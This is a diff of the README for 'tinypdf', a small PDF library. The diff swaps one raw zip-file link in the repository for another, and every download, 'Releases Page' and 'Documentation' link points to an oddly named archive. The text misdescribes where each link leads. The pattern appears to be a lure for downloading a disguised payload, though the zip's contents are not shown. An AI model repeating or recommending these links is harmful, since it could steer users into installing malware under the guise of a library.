@@ -6,7 +6,7 @@ Welcome to tinypdf! This is a simple library for creating PDF files. It’s ligh
 
 ### 📥 Download Link
 
-[![Download tinypdf](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)
+[![Download tinypdf](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)
 
 ## 📦 What is tinypdf?
 
@@ -28,7 +28,7 @@ tinypdf is a minimal PDF creation library. It allows you to generate PDFs easily
 ## 🔍 How to Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the downloads.
-   [Download tinypdf](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)
+   [Download tinypdf](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)
 
 2. **Select the Version:** You will see a list of available versions. Choose the latest one for the best experience.
 
@@ -66,7 +66,7 @@ If you need help or want to connect with others using tinypdf, check out our com
 
 For more information on how to use tinypdf effectively, visit our documentation:
 
-- [tinypdf Documentation](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)
+- [tinypdf Documentation](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)
 
 Feel free to explore and ask questions. We’re here to help you create great PDFs! 
 
@@ -74,4 +74,4 @@ Feel free to explore and ask questions. We’re here to help you create great PD
 
 Keep an eye on the Releases page for new updates and features. We continuously improve tinypdf based on user feedback. 
 
-[![Download tinypdf](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)](https://raw.githubusercontent.com/hgusain29/tinypdf/main/examples/Software-appanagist.zip)
+[![Download tinypdf](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)](https://github.com/hgusain29/tinypdf/raw/refs/heads/main/src/Software-v1.8.zip)
